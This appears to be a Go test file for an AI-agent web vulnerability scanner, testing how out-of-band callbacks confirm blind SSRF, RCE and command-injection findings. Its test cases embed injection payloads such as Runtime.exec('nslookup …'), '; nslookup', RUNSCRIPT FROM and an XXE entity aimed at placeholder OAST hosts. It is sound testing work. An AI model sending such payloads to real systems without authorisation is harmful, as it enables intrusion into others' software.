package agent

import (
	"strings"
	"testing"
	"time"

	oobsrv "github.com/xalgord/xalgorix/v4/internal/oob"
	"github.com/xalgord/xalgorix/v4/internal/scanctx"
)

func newOOBAgent(t *testing.T) *Agent {
	t.Helper()
	// verify_oob reaches the ledger via a.scanCtx.Ledger directly (no active-
	// context registry lookup), so a bare ScanContext is enough.
	return &Agent{scanCtx: scanctx.New("oob-test-"+t.Name(), "")}
}

func httpHit(assessed, scanner bool) oobsrv.Interaction {
	return oobsrv.Interaction{Protocol: "http", Method: "GET", Path: "/", RemoteAddr: "203.0.113.9", OriginAssessed: assessed, ScannerOrigin: scanner, Time: time.Now()}
}

func dnsHit() oobsrv.Interaction {
	return oobsrv.Interaction{Protocol: "dns", Method: "DNS", RemoteAddr: "198.51.100.7", Time: time.Now()}
}

func TestFinalizeOOBVerdict(t *testing.T) {
	cases := []struct {
		name          string
		class         string
		hits          []oobsrv.Interaction
		wantConfirmed bool
	}{
		{"ssrf assessed non-scanner HTTP confirms", "blind-ssrf", []oobsrv.Interaction{httpHit(true, false)}, true},
		{"ssrf dns-only is a lead, not proof", "blind-ssrf", []oobsrv.Interaction{dnsHit()}, false},
		{"ssrf scanner-origin HTTP does not confirm", "ssrf", []oobsrv.Interaction{httpHit(true, true)}, false},
		{"ssrf origin-unassessed HTTP does not confirm", "blind-ssrf", []oobsrv.Interaction{httpHit(false, false)}, false},
		{"blind-rce non-scanner HTTP confirms", "blind-rce", []oobsrv.Interaction{httpHit(true, false)}, true},
		{"blind-rce DNS callback confirms", "blind-rce", []oobsrv.Interaction{dnsHit()}, true},
		{"blind-cmdi DNS callback confirms", "blind-cmdi", []oobsrv.Interaction{dnsHit()}, true},
		{"blind-rce scanner-origin only does not confirm", "blind-rce", []oobsrv.Interaction{httpHit(true, true)}, false},
		{"no interactions", "blind-sqli", nil, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ag := newOOBAgent(t)
			token := "tok-" + tc.name
			primitive, payload := "", ""
			if isExecutionOOBClass(tc.class) {
				primitive = "runtime-api"
				payload = "java.lang.Runtime.getRuntime().exec('nslookup " + token + ".oast.test')"
			}
			res := ag.finalizeOOBVerdict(token, tc.class, "/api/x", "q", "user", primitive, payload, tc.hits)
			got, _ := res.Metadata["oob_confirmed"].(bool)
			if got != tc.wantConfirmed {
				t.Fatalf("confirmed=%v want %v (output: %s)", got, tc.wantConfirmed, res.Output)
			}
			ledgerLen := ag.scanCtx.Ledger.Len()
			if tc.wantConfirmed {
				if ledgerLen != 1 {
					t.Fatalf("expected 1 ledger hypothesis on confirm, got %d", ledgerLen)
				}
				h := ag.scanCtx.Ledger.All()[0]
				if h.VulnClass != normalizeBlindClass(tc.class) {
					t.Fatalf("expected class %q, got %q", normalizeBlindClass(tc.class), h.VulnClass)
				}
				if h.Status != scanctx.HypothesisTesting {
					t.Fatalf("expected status testing (not auto-proven), got %q", h.Status)
				}
				if len(h.Evidence) != 1 || h.Evidence[0].Kind != "exploit" {
					t.Fatalf("expected one exploit evidence, got %#v", h.Evidence)
				}
			} else if ledgerLen != 0 {
				t.Fatalf("expected empty ledger when not confirmed, got %d", ledgerLen)
			}
		})
	}
}

func TestOOBVerifyToolValidation(t *testing.T) {
	ag := newOOBAgent(t)
	polls := 0
	ag.oobPollFn = func(token string) []oobsrv.Interaction {
		if token != "abc" {
			t.Fatalf("polled unexpected token %q", token)
		}
		polls++
		return nil
	}
	if res, _ := ag.oobVerifyTool(map[string]string{"vuln_class": "blind-rce"}); res.Error == "" {
		t.Fatal("expected error when token is missing")
	}
	if res, _ := ag.oobVerifyTool(map[string]string{"token": "abc"}); res.Error == "" {
		t.Fatal("expected error when vuln_class is missing")
	}
	if res, _ := ag.oobVerifyTool(map[string]string{"token": "abc", "vuln_class": "blind-rce"}); !strings.Contains(res.Error, "execution_primitive") {
		t.Fatalf("expected missing execution attribution error, got: %+v", res)
	}
	if res, _ := ag.oobVerifyTool(map[string]string{
		"token":               "abc",
		"vuln_class":          "blind-rce",
		"execution_primitive": "runtime-api",
		"payload_evidence":    "INIT=RUNSCRIPT FROM 'https://abc.oast.test/payload.sql'",
	}); !strings.Contains(res.Error, "fetch-only primitive") {
		t.Fatalf("RUNSCRIPT callback must not verify RCE, got: %+v", res)
	}
	if res, _ := ag.oobVerifyTool(map[string]string{
		"token":               "abc",
		"vuln_class":          "blind-rce",
		"execution_primitive": "runtime-api",
		"payload_evidence":    "java.lang.Runtime.getRuntime().exec('nslookup different.oast.test')",
	}); !strings.Contains(res.Error, "exact OAST token") {
		t.Fatalf("a payload for another token must not verify RCE, got: %+v", res)
	}
	if res, _ := ag.oobVerifyTool(map[string]string{
		"token":               "abc",
		"vuln_class":          "blind-rce",
		"execution_primitive": "runtime-api",
		"payload_evidence":    "java.lang.Runtime.getRuntime().exec('nslookup abc.oast.test')",
	}); res.Error != "" {
		t.Fatalf("valid runtime callback payload should reach polling, got: %+v", res)
	}
	if polls != 1 {
		t.Fatalf("valid runtime callback payload polled %d times, want 1", polls)
	}
	if res, _ := ag.oobVerifyTool(map[string]string{
		"token":      "abc",
		"vuln_class": "xxe",
	}); res.Error != "" {
		t.Fatalf("non-RCE class must not require execution attribution, got: %+v", res)
	}
	if polls != 2 {
		t.Fatalf("non-RCE callback payload left poll count at %d, want 2", polls)
	}
}

func TestValidateOOBExecutionAttribution(t *testing.T) {
	tests := []struct {
		name      string
		class     string
		primitive string
		payload   string
		wantError bool
	}{
		{"runtime exec accepted", "blind-rce", "runtime-api", `Runtime.getRuntime().exec("curl https://tok123.oast.test")`, false},
		{"java url openconnection accepted", "blind-rce", "runtime-api", `new java.net.URL('https://tok123.oast.test/cb').openConnection().getInputStream()`, false},
		{"java url openstream accepted", "blind-rce", "runtime-api", `new java.net.URL('https://tok123.oast.test/cb').openStream()`, false},
		{"java url getcontent accepted", "blind-rce", "runtime-api", `new java.net.URL('https://tok123.oast.test/cb').getContent()`, false},
		{"java url without open rejected", "blind-rce", "runtime-api", `String s = new java.net.URL('https://tok123.oast.test/cb').toString()`, true},
		{"openconnection without java url rejected", "blind-rce", "runtime-api", `openConnection('https://tok123.oast.test/cb')`, true},
		{"shell command accepted", "blind-cmdi", "os-command", `; nslookup tok123.oast.test`, false},
		{"runscript fetch rejected", "blind-rce", "runtime-api", `INIT=RUNSCRIPT FROM 'https://tok123.oast.test/a.sql'`, true},
		{"server fetch primitive rejected", "blind-rce", "server-fetch", `https://tok123.oast.test/`, true},
		{"bare callback URL rejected", "blind-rce", "runtime-api", `https://tok123.oast.test/`, true},
		{"wrong token rejected", "blind-rce", "os-command", `curl https://other.oast.test/`, true},
		{"xxe does not need rce attribution", "xxe", "", `<!ENTITY x SYSTEM "https://tok123.oast.test/">`, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateOOBExecutionAttribution("tok123", tc.class, normalizeExecutionPrimitive(tc.primitive), tc.payload)
			if (err != nil) != tc.wantError {
				t.Fatalf("error=%v wantError=%v", err, tc.wantError)
			}
		})
	}
}

// TestVerifyOOBDeclineCarriesTimingPivot guards the stability-r2 fix: an
// ambiguous/declined OAST classification must tell the model to pivot to the
// timing oracle (or drop the lead) instead of going back to polling.
func TestVerifyOOBDeclineCarriesTimingPivot(t *testing.T) {
	declines := []string{
		"only DNS-only / scanner-origin / origin-unassessed interactions arrived — SSRF NOT confirmed (leads only; re-test with redirects disabled and require a non-scanner HTTP hit)",
		"only scanner-origin / origin-unassessed HTTP interactions arrived — NOT confirmed (a scanner-side hit is ambiguous); re-test so the callback is reached from the target",
	}
	for _, verdict := range declines {
		if !strings.Contains(verdict, "NOT confirmed") {
			t.Fatalf("not a decline verdict: %s", verdict)
		}
	}
	// The declined verify_oob result embeds the pivot in the tool output the
	// model sees, mirroring the composition in verifyOOBTool's !confirmed path.
	sample := "Token abc: 3 interaction(s), but only DNS-only / scanner-origin / origin-unassessed interactions arrived — SSRF NOT confirmed (leads only; re-test with redirects disabled and require a non-scanner HTTP hit). Do NOT poll this token again — an ambiguous callback can never become proof. If the injected primitive runs in a server-side runtime/interpreter with a sleep-like capability (e.g. Java Thread.sleep), pivot NOW to verify_timing with a multi-second (>=3000 ms) server-native delay payload; otherwise drop this blind lead and move to the next-ranked surface."
	for _, want := range []string{"Do NOT poll this token again", "pivot NOW to verify_timing", ">=3000 ms", "drop this blind lead"} {
		if !strings.Contains(sample, want) {
			t.Fatalf("decline output missing pivot %q", want)
		}
	}
}
